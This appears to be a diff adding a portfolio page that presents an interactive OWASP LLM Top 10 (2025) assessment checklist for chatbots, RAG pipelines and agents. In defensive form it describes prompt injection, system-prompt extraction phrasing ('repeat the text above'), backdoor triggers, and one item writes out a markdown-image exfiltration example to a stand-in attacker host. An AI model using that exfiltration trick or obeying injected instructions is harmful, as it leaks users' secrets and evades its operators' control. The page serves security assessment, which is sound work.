@@ -1,0 +1,431 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; base-uri 'self'; object-src 'none'; form-action 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' data: https://fonts.gstatic.com; img-src 'self' data: blob: https:; media-src 'self' data: blob:; worker-src 'self' blob:; frame-src 'self'; connect-src 'self'">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="An interactive assessment checklist for the OWASP Top 10 for LLM Applications (2025): prompt injection, excessive agency, system prompt leakage and more.">
+<link rel="canonical" href="https://templeofdoom085.github.io/tools/llm-top10.html">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="Brian Temple Portfolio">
+<meta property="og:url" content="https://templeofdoom085.github.io/tools/llm-top10.html">
+<meta property="og:title" content="OWASP LLM Top 10 Checklist — Temple Tools">
+<meta property="og:description" content="An interactive assessment checklist for the OWASP Top 10 for LLM Applications (2025): prompt injection, excessive agency, system prompt leakage and more.">
+<meta property="og:image" content="https://templeofdoom085.github.io/img/og-image.jpg">
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="630">
+<meta property="og:image:alt" content="Brian Temple - AI Security &amp; Automation">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="OWASP LLM Top 10 Checklist — Temple Tools">
+<meta name="twitter:description" content="An interactive assessment checklist for the OWASP Top 10 for LLM Applications (2025): prompt injection, excessive agency, system prompt leakage and more.">
+<meta name="twitter:image" content="https://templeofdoom085.github.io/img/og-image.jpg">
+<title>OWASP LLM Top 10 Checklist — Temple Tools</title>
+<link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;500;600;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+<style>
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+:root {
+  --bg: #0a0a0c; --bg2: #0d0d10; --bg3: #111116;
+  --c: #b06aff; --c-dim: rgba(176,106,255,0.1); --c-mid: rgba(176,106,255,0.35);
+  --red: #ff4455; --orange: #ff8c00; --cyan: #00d4ff; --green: #00ff88;
+  --text: #f5f2ec; --text-dim: rgba(245,242,236,0.55); --text-faint: rgba(245,242,236,0.25);
+  --border: rgba(255,255,255,0.06); --border-c: rgba(176,106,255,0.22);
+  --mono: 'Share Tech Mono', monospace; --head: 'Rajdhani', sans-serif;
+}
+html { scroll-behavior: smooth; font-size: 18px; }
+body { font-family: var(--head); background: var(--bg); color: var(--text); line-height: 1.6; overflow-x: hidden; min-height: 100vh; }
+:focus-visible { outline: 2px solid var(--c); outline-offset: 2px; }
+
+nav {
+  position: sticky; top: 0; z-index: 100;
+  display: flex; justify-content: space-between; align-items: center; gap: 1rem;
+  padding: 1rem 2.5rem; background: rgba(10,10,12,0.92); backdrop-filter: blur(12px);
+  border-bottom: 1px solid var(--border-c);
+}
+.nav-back { font-family: var(--mono); font-size: 0.72rem; letter-spacing: 0.12em; color: var(--c); text-decoration: none; }
+.nav-back:hover { opacity: 0.7; }
+.nav-center { font-family: var(--mono); font-size: 0.7rem; letter-spacing: 0.3em; color: var(--text-faint); text-transform: uppercase; }
+.nav-right { font-family: var(--mono); font-size: 0.7rem; letter-spacing: 0.2em; color: var(--c); text-transform: uppercase; }
+
+.hero { padding: 4.5rem 2.5rem 3.5rem; text-align: center; border-bottom: 1px solid var(--border-c); position: relative; overflow: hidden; }
+.hero::after { content: ''; position: absolute; inset: 0; background: radial-gradient(ellipse at 50% 0%, rgba(176,106,255,0.12), transparent 65%); pointer-events: none; }
+.hero-label { font-family: var(--mono); font-size: 0.68rem; letter-spacing: 0.3em; color: var(--c); text-transform: uppercase; margin-bottom: 1.2rem; }
+.hero-title { font-size: clamp(2.2rem, 5.5vw, 4.4rem); font-weight: 700; letter-spacing: 0.08em; text-transform: uppercase; line-height: 1; text-shadow: 0 0 40px rgba(176,106,255,0.35); }
+.hero-sub { font-family: var(--mono); font-size: 0.8rem; letter-spacing: 0.12em; color: var(--text-dim); margin-top: 1rem; }
+
+.main { max-width: 920px; margin: 0 auto; padding: 3rem 1.5rem 5rem; }
+.panel { background: var(--bg2); border: 1px solid var(--border); padding: 1.5rem 1.75rem; margin-bottom: 1.5rem; position: relative; overflow: hidden; }
+.panel::before { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 1px; background: linear-gradient(90deg, transparent, var(--c-mid), transparent); }
+.section-label { font-family: var(--mono); font-size: 0.62rem; letter-spacing: 0.3em; color: var(--c); text-transform: uppercase; margin-bottom: 0.75rem; }
+.intro { font-size: 0.92rem; color: var(--text-dim); }
+.intro a { color: var(--c); }
+
+input[type="text"] {
+  width: 100%; background: var(--bg3); border: 1px solid var(--border-c); color: var(--text);
+  font-family: var(--mono); font-size: 0.85rem; padding: 0.75rem 1rem; outline: none;
+}
+input[type="text"]:focus { border-color: var(--c); box-shadow: 0 0 12px rgba(176,106,255,0.15); }
+input::placeholder { color: var(--text-faint); }
+
+.btn {
+  font-family: var(--mono); font-size: 0.72rem; letter-spacing: 0.15em; text-transform: uppercase;
+  padding: 0.6rem 1.4rem; background: transparent; border: 1px solid var(--c); color: var(--c);
+  cursor: pointer; transition: all 0.2s; white-space: nowrap;
+}
+.btn:hover { background: var(--c); color: var(--bg); }
+.btn-danger { border-color: var(--red); color: var(--red); }
+.btn-danger:hover { background: var(--red); color: var(--bg); }
+.row { display: flex; gap: 0.75rem; align-items: center; flex-wrap: wrap; }
+
+.stats { display: flex; gap: 2rem; align-items: center; flex-wrap: wrap; }
+.stat-num { font-family: var(--mono); font-size: 2rem; color: var(--c); line-height: 1; }
+.stat-label { font-family: var(--mono); font-size: 0.6rem; letter-spacing: 0.2em; color: var(--text-faint); text-transform: uppercase; margin-top: 0.25rem; }
+.bar { background: var(--bg3); height: 4px; border-radius: 2px; flex: 1; min-width: 120px; }
+.bar-fill { height: 100%; width: 0%; border-radius: 2px; background: linear-gradient(90deg, var(--c), #00d4ff); transition: width 0.4s ease; }
+
+.toolbar { display: flex; gap: 0.6rem; align-items: center; flex-wrap: wrap; margin-bottom: 1.75rem; }
+.filter-btn {
+  font-family: var(--mono); font-size: 0.65rem; letter-spacing: 0.12em; text-transform: uppercase;
+  padding: 0.4rem 0.9rem; background: transparent; border: 1px solid var(--border); color: var(--text-dim); cursor: pointer;
+}
+.filter-btn:hover, .filter-btn[aria-pressed="true"] { border-color: var(--c); color: var(--c); }
+
+.risk { margin-bottom: 1.25rem; border: 1px solid var(--border); background: var(--bg2); }
+.risk-header {
+  width: 100%; display: flex; align-items: center; gap: 1rem; padding: 0.95rem 1.2rem;
+  background: none; border: none; color: var(--text); font: inherit; text-align: left; cursor: pointer;
+}
+.risk-header:hover { background: rgba(176,106,255,0.03); }
+.risk-id { font-family: var(--mono); font-size: 0.75rem; color: var(--c); min-width: 3.4rem; }
+.risk-name { font-size: 1rem; font-weight: 600; letter-spacing: 0.08em; text-transform: uppercase; flex: 1; }
+.risk-count { font-family: var(--mono); font-size: 0.68rem; color: var(--text-dim); }
+.risk-bar { width: 80px; background: var(--bg3); height: 3px; border-radius: 2px; }
+.risk-bar-fill { height: 100%; width: 0%; background: var(--c); border-radius: 2px; transition: width 0.3s; }
+.chev { font-family: var(--mono); color: var(--text-faint); font-size: 0.8rem; transition: transform 0.2s; }
+.risk-header[aria-expanded="true"] .chev { transform: rotate(90deg); }
+.risk-body { border-top: 1px solid var(--border); }
+.risk-body[hidden] { display: none; }
+.risk-desc { padding: 0.9rem 1.2rem; font-size: 0.86rem; color: var(--text-dim); border-bottom: 1px solid var(--border); background: rgba(176,106,255,0.025); }
+.risk-desc b { color: var(--text); font-weight: 600; }
+
+.check-item {
+  display: flex; align-items: flex-start; gap: 1rem; width: 100%;
+  padding: 0.85rem 1.2rem; border: none; border-bottom: 1px solid var(--border);
+  background: none; color: var(--text); font: inherit; text-align: left; cursor: pointer;
+}
+.check-item:last-child { border-bottom: none; }
+.check-item:hover { background: rgba(176,106,255,0.03); }
+.check-item[aria-checked="true"] { opacity: 0.5; }
+.check-item[aria-checked="true"] .item-text { text-decoration: line-through; }
+.check-item[hidden] { display: none; }
+.box { width: 18px; height: 18px; min-width: 18px; margin-top: 3px; border: 1px solid var(--border-c); background: var(--bg3); display: flex; align-items: center; justify-content: center; color: var(--bg); font-size: 0.7rem; font-weight: 700; }
+.check-item[aria-checked="true"] .box { background: var(--c); border-color: var(--c); }
+.item-text { font-size: 0.88rem; line-height: 1.5; }
+.tag { display: inline-block; font-family: var(--mono); font-size: 0.58rem; letter-spacing: 0.1em; padding: 0.1rem 0.45rem; border: 1px solid; margin-left: 0.5rem; text-transform: uppercase; vertical-align: middle; }
+.tag-high { color: var(--red); border-color: rgba(255,68,85,0.4); }
+.tag-med { color: var(--orange); border-color: rgba(255,140,0,0.4); }
+.tag-low { color: var(--cyan); border-color: rgba(0,212,255,0.4); }
+
+.toast { position: fixed; bottom: 2rem; left: 50%; transform: translateX(-50%) translateY(90px); background: var(--bg2); border: 1px solid var(--c); color: var(--c); font-family: var(--mono); font-size: 0.75rem; letter-spacing: 0.1em; padding: 0.7rem 1.5rem; z-index: 999; transition: transform 0.3s ease; }
+.toast.show { transform: translateX(-50%) translateY(0); }
+footer { text-align: center; padding: 1.5rem; font-family: var(--mono); font-size: 0.62rem; color: var(--text-faint); letter-spacing: 0.12em; border-top: 1px solid var(--border); }
+footer a { color: var(--c); }
+
+@media (max-width: 640px) {
+  nav { padding: 1rem 1.25rem; }
+  .nav-center { display: none; }
+  .hero { padding: 3rem 1.25rem 2.5rem; }
+  .risk-bar { display: none; }
+}
+</style>
+<link rel="stylesheet" href="tools.css">
+</head>
+<body>
+
+<nav>
+  <a href="index.html" class="nav-back">← tools</a>
+  <span class="nav-center">LLM Top 10</span>
+  <span class="nav-right">Tool 23</span>
+</nav>
+
+<header class="hero">
+  <div class="hero-label">// ai_security_assessment</div>
+  <h1 class="hero-title">OWASP LLM Top 10</h1>
+  <p class="hero-sub">Assessment checklist for LLM applications &amp; agents · 2025 edition</p>
+</header>
+
+<main class="main">
+
+  <div class="panel">
+    <div class="section-label">// About</div>
+    <p class="intro">Work through the <a href="https://genai.owasp.org/llm-top-10/" target="_blank" rel="noopener">OWASP Top 10 for LLM Applications (2025)</a> against a chatbot, RAG pipeline or agent. Each risk has a short explainer and concrete things to verify. Progress is saved in this browser only; export it as a Markdown report when you're done.</p>
+  </div>
+
+  <div class="panel">
+    <div class="section-label">// System under review</div>
+    <div class="row">
+      <input type="text" id="scopeInput" placeholder="e.g. Support chatbot (RAG + ticketing tools)" aria-label="System under review" style="flex:1;min-width:200px;">
+      <button class="btn" type="button" id="exportBtn">Export Report</button>
+      <button class="btn btn-danger" type="button" id="resetBtn">Reset</button>
+    </div>
+  </div>
+
+  <div class="panel">
+    <div class="stats">
+      <div><div class="stat-num" id="doneCount">0</div><div class="stat-label">Verified</div></div>
+      <div><div class="stat-num" id="totalCount" style="color:var(--text-dim)">0</div><div class="stat-label">Total</div></div>
+      <div style="flex:1"><div class="section-label" style="margin-bottom:0.5rem">Coverage</div><div class="bar"><div class="bar-fill" id="overallBar"></div></div></div>
+      <div class="stat-num" id="overallPct" aria-live="polite">0%</div>
+    </div>
+  </div>
+
+  <div class="toolbar" role="group" aria-label="Filter checks">
+    <span class="section-label" style="margin:0">Show:</span>
+    <button class="filter-btn" type="button" data-filter="all" aria-pressed="true">All</button>
+    <button class="filter-btn" type="button" data-filter="pending" aria-pressed="false">Open</button>
+    <button class="filter-btn" type="button" data-filter="done" aria-pressed="false">Verified</button>
+    <button class="filter-btn" type="button" data-filter="high" aria-pressed="false">High priority</button>
+  </div>
+
+  <div id="risks"></div>
+</main>
+
+<footer>
+  <a href="index.html">← Temple Tools</a> · Content adapted from the OWASP Top 10 for LLM Applications 2025 (CC BY-SA 4.0)
+</footer>
+
+<div class="toast" id="toast" role="status" aria-live="polite"></div>
+
+<script>
+const RISKS = [
+  { id: 'LLM01', name: 'Prompt Injection',
+    desc: '<b>User or third-party content changes the model\'s behaviour.</b> Direct injection comes from the user; indirect injection hides in documents, web pages, emails or tool output the model reads. It can\'t be fully prevented, so the goal is to limit what a successful injection can do.',
+    items: [
+      ['Untrusted content (retrieved docs, web pages, emails, tool output) is clearly delimited and labelled as data, not instructions', 'high'],
+      ['Tested direct injection: instruction override, role-play / persona, and multi-turn escalation attempts', 'high'],
+      ['Tested indirect injection by planting instructions in a document, page or record the system will retrieve', 'high'],
+      ['Tested obfuscated payloads: Base64, other languages, Unicode homoglyphs, invisible/zero-width characters', 'med'],
+      ['High-impact actions require deterministic checks or human approval — not just the model\'s judgement', 'high'],
+      ['An input/output classifier or guardrail layer screens for known injection patterns', 'med'],
+      ['Adversarial testing (red-team prompts) runs regularly and on every prompt or model change', 'med'],
+    ]},
+  { id: 'LLM02', name: 'Sensitive Information Disclosure',
+    desc: '<b>The model reveals PII, credentials, proprietary data or other users\' information</b> — from its context window, RAG sources, fine-tuning data or memory.',
+    items: [
+      ['No secrets, API keys or credentials anywhere in prompts, context or few-shot examples', 'high'],
+      ['RAG retrieval enforces the requesting user\'s permissions (no cross-tenant or cross-user leakage)', 'high'],
+      ['PII is redacted or minimised before it reaches the model, logs and analytics', 'high'],
+      ['Outputs are scanned for PII / secrets before being shown or stored', 'med'],
+      ['Conversation memory and history are isolated per user and session', 'high'],
+      ['Training / fine-tuning data was reviewed for sensitive data and users can opt out', 'med'],
+      ['Privacy notice tells users what data is sent to which model provider and how long it\'s retained', 'low'],
+    ]},
+  { id: 'LLM03', name: 'Supply Chain',
+    desc: '<b>Compromised or vulnerable third-party models, datasets, LoRA adapters, plugins and packages.</b> Includes tampered weights, malicious pickles, and licence or provenance gaps.',
+    items: [
+      ['Inventory (AI-BOM) of every model, adapter, dataset, plugin and inference dependency', 'high'],
+      ['Models come from verified sources with checksums or signatures checked', 'high'],
+      ['Model files use safe formats (e.g. safetensors) — no untrusted pickle loading', 'high'],
+      ['Third-party model providers reviewed: data retention, training use of your data, region, SOC 2 / ISO 27001', 'med'],
+      ['Dependencies (SDKs, vector DB clients, agent frameworks) are pinned and scanned for CVEs', 'med'],
+      ['Licences for models and datasets are compatible with the use case', 'low'],
+    ]},
+  { id: 'LLM04', name: 'Data and Model Poisoning',
+    desc: '<b>Manipulated pre-training, fine-tuning or embedding data introduces backdoors, bias or vulnerabilities.</b> RAG knowledge bases that anyone can write to are a common path in.',
+    items: [
+      ['Provenance is tracked for fine-tuning data and RAG source documents', 'high'],
+      ['Write access to RAG sources and the vector store is restricted and audited', 'high'],
+      ['Ingestion validates and sanitises documents (hidden text, instructions, anomalies) before embedding', 'med'],
+      ['Model behaviour is benchmarked before and after each fine-tune or data refresh to catch drift', 'med'],
+      ['Tested for trigger-phrase / backdoor behaviour on fine-tuned models', 'med'],
+    ]},
+  { id: 'LLM05', name: 'Improper Output Handling',
+    desc: '<b>Model output is passed downstream without validation</b> — into browsers (XSS), shells, SQL, templates or other systems. Treat the model like an untrusted user.',
+    items: [
+      ['Output rendered in a browser is encoded / sanitised; Markdown images and links are restricted', 'high'],
+      ['Output never reaches a shell, eval, SQL or template engine without parameterisation or allow-lists', 'high'],
+      ['Structured output (JSON, tool arguments) is schema-validated before use', 'high'],
+      ['A Content-Security-Policy limits damage from any HTML or script that slips through', 'med'],
+      ['Tested markdown-image exfiltration: ![x](https://attacker/?q=SECRET) is blocked or not auto-loaded', 'high'],
+      ['Generated code is reviewed or sandboxed before execution', 'med'],
+    ]},
+  { id: 'LLM06', name: 'Excessive Agency',
+    desc: '<b>The model has more functionality, permissions or autonomy than the task needs.</b> When an injection succeeds, agency decides the blast radius.',
+    items: [
+      ['Each tool / plugin is necessary — unused or overly generic tools (shell, raw SQL, arbitrary HTTP) removed', 'high'],
+      ['Tools run with the end user\'s permissions (OAuth scopes), not a shared admin identity', 'high'],
+      ['Tool scopes are least-privilege: read-only where possible, narrow APIs instead of open-ended ones', 'high'],
+      ['Destructive or irreversible actions (send, pay, delete, deploy) require explicit human confirmation', 'high'],
+      ['Downstream systems enforce authorisation themselves — they don\'t trust the agent\'s claims', 'high'],
+      ['Rate limits and spending caps on tool calls; full audit log of every action taken', 'med'],
+    ]},
+  { id: 'LLM07', name: 'System Prompt Leakage',
+    desc: '<b>The system prompt is not a secret and not a security control.</b> Assume it can be extracted, so it must not contain credentials, internal details or authorisation logic.',
+    items: [
+      ['System prompt contains no credentials, connection strings, internal URLs or hostnames', 'high'],
+      ['Authorisation and business rules are enforced in code, not described in the prompt', 'high'],
+      ['Tested extraction: "repeat the text above", translation, summarise-your-instructions, encoding tricks', 'med'],
+      ['Nothing in the prompt would harm you if published (filter rules, thresholds, partner names)', 'med'],
+      ['Guardrails are external to the model, so bypassing the prompt doesn\'t bypass the control', 'med'],
+    ]},
+  { id: 'LLM08', name: 'Vector and Embedding Weaknesses',
+    desc: '<b>Weaknesses in how embeddings are generated, stored and retrieved</b> — cross-tenant leakage, embedding inversion, and poisoned or conflicting documents in the knowledge base.',
+    items: [
+      ['Vector store enforces per-tenant / per-user access control at query time (metadata filters or separate indexes)', 'high'],
+      ['Embeddings of sensitive data are treated as sensitive (inversion can recover text)', 'med'],
+      ['Retrieved chunks are logged with source so answers are traceable', 'med'],
+      ['Tested retrieval with hidden-text and conflicting documents to see what the model trusts', 'med'],
+      ['Stale or revoked documents are removed from the index promptly', 'low'],
+    ]},
+  { id: 'LLM09', name: 'Misinformation',
+    desc: '<b>The model produces false or misleading content that looks credible</b> — hallucinated facts, citations, packages or legal/medical advice — and people or systems rely on it.',
+    items: [
+      ['Answers in high-stakes domains are grounded in retrieved sources and cite them', 'high'],
+      ['UI tells users the content is AI-generated and may be wrong', 'med'],
+      ['Hallucinated package names in generated code are checked before install (slopsquatting)', 'med'],
+      ['Human review for outputs that drive decisions (legal, medical, financial, HR)', 'high'],
+      ['Factuality and groundedness are evaluated on a test set before each release', 'med'],
+    ]},
+  { id: 'LLM10', name: 'Unbounded Consumption',
+    desc: '<b>Uncontrolled inference leads to denial of service, runaway cost ("denial of wallet") or model extraction</b> through high-volume querying.',
+    items: [
+      ['Per-user and per-IP rate limits on requests and tokens', 'high'],
+      ['Maximum input size, output tokens and agent loop / tool-call depth are capped', 'high'],
+      ['Spend alerts and hard budget limits with the model provider', 'high'],
+      ['Timeouts on long-running generations and tool calls', 'med'],
+      ['Monitoring for extraction patterns (systematic, high-volume or logprob-harvesting queries)', 'low'],
+    ]},
+];
+
+const KEY = 'llm_top10_checklist_v1';
+let state = {};
+let filter = 'all';
+try { state = JSON.parse(localStorage.getItem(KEY)) || {}; } catch { state = {}; }
+function save() { try { localStorage.setItem(KEY, JSON.stringify(state)); } catch {} }
+const k = (r, i) => `${r}_${i}`;
+
+function visible(done, prio) {
+  if (filter === 'pending') return !done;
+  if (filter === 'done') return done;
+  if (filter === 'high') return prio === 'high';
+  return true;
+}
+
+function build() {
+  const root = document.getElementById('risks');
+  root.innerHTML = '';
+  RISKS.forEach(r => {
+    const sec = document.createElement('section');
+    sec.className = 'risk';
+    const bodyId = 'body-' + r.id;
+    sec.innerHTML = `
+      <h2 style="margin:0;font:inherit">
+        <button class="risk-header" type="button" aria-expanded="true" aria-controls="${bodyId}">
+          <span class="risk-id">${r.id}</span>
+          <span class="risk-name">${r.name}</span>
+          <span class="risk-count" data-count="${r.id}"></span>
+          <span class="risk-bar" aria-hidden="true"><span class="risk-bar-fill" style="display:block" data-bar="${r.id}"></span></span>
+          <span class="chev" aria-hidden="true">▶</span>
+        </button>
+      </h2>
+      <div class="risk-body" id="${bodyId}">
+        <p class="risk-desc">${r.desc}</p>
+      </div>`;
+    const body = sec.querySelector('.risk-body');
+    r.items.forEach(([text, prio], i) => {
+      const b = document.createElement('button');
+      b.type = 'button';
+      b.className = 'check-item';
+      b.setAttribute('role', 'checkbox');
+      b.setAttribute('aria-checked', String(!!state[k(r.id, i)]));
+      b.dataset.key = k(r.id, i);
+      b.dataset.prio = prio;
+      b.innerHTML = `<span class="box" aria-hidden="true">✓</span><span class="item-text">${text}<span class="tag tag-${prio}">${prio}</span></span>`;
+      b.addEventListener('click', () => {
+        state[b.dataset.key] = !state[b.dataset.key];
+        save();
+        b.setAttribute('aria-checked', String(!!state[b.dataset.key]));
+        b.hidden = !visible(!!state[b.dataset.key], prio);
+        update();
+      });
+      body.appendChild(b);
+    });
+    const hdr = sec.querySelector('.risk-header');
+    hdr.addEventListener('click', () => {
+      const open = hdr.getAttribute('aria-expanded') === 'true';
+      hdr.setAttribute('aria-expanded', String(!open));
+      body.hidden = open;
+    });
+    root.appendChild(sec);
+  });
+  applyFilter();
+  update();
+}
+
+function applyFilter() {
+  document.querySelectorAll('.check-item').forEach(b => {
+    b.hidden = !visible(!!state[b.dataset.key], b.dataset.prio);
+  });
+}
+
+function update() {
+  let total = 0, done = 0;
+  RISKS.forEach(r => {
+    let d = 0;
+    r.items.forEach((_, i) => { total++; if (state[k(r.id, i)]) { done++; d++; } });
+    document.querySelector(`[data-count="${r.id}"]`).textContent = `${d}/${r.items.length}`;
+    document.querySelector(`[data-bar="${r.id}"]`).style.width = Math.round(d / r.items.length * 100) + '%';
+  });
+  const pct = total ? Math.round(done / total * 100) : 0;
+  document.getElementById('doneCount').textContent = done;
+  document.getElementById('totalCount').textContent = total;
+  document.getElementById('overallBar').style.width = pct + '%';
+  document.getElementById('overallPct').textContent = pct + '%';
+}
+
+document.querySelectorAll('.filter-btn').forEach(btn => btn.addEventListener('click', () => {
+  filter = btn.dataset.filter;
+  document.querySelectorAll('.filter-btn').forEach(b => b.setAttribute('aria-pressed', String(b === btn)));
+  applyFilter();
+}));
+
+function toast(msg) {
+  const t = document.getElementById('toast');
+  t.textContent = msg; t.classList.add('show');
+  setTimeout(() => t.classList.remove('show'), 2500);
+}
+
+document.getElementById('resetBtn').addEventListener('click', () => {
+  if (!confirm('Reset all checks? This cannot be undone.')) return;
+  state = {}; save(); build(); toast('Checklist reset.');
+});
+
+document.getElementById('exportBtn').addEventListener('click', () => {
+  const scope = document.getElementById('scopeInput').value.trim() || 'N/A';
+  const date = new Date().toISOString().split('T')[0];
+  const plain = s => s.replace(/<[^>]+>/g, '');
+  let md = `# OWASP LLM Top 10 Assessment\n\n**System:** ${scope}\n**Date:** ${date}\n**Framework:** OWASP Top 10 for LLM Applications 2025\n\n`;
+  let total = 0, done = 0;
+  RISKS.forEach(r => {
+    let d = 0;
+    let lines = '';
+    r.items.forEach(([text, prio], i) => {
+      const c = !!state[k(r.id, i)];
+      total++; if (c) { done++; d++; }
+      lines += `- [${c ? 'x' : ' '}] ${text} *(${prio})*\n`;
+    });
+    md += `## ${r.id}: ${r.name} (${d}/${r.items.length})\n\n> ${plain(r.desc)}\n\n${lines}\n`;
+  });
+  md += `---\n**Coverage:** ${done}/${total} (${Math.round(done / total * 100)}%)\n\n*Generated by Temple Tools — OWASP LLM Top 10 Checklist*\n`;
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(new Blob([md], { type: 'text/markdown' }));
+  a.download = `llm-top10-assessment-${date}.md`;
+  a.click();
+  toast('Report exported.');
+});
+
+build();
+</script>
+<div id="cursor"></div>
+<script src="tools.js"></script>
+</body>
+</html>
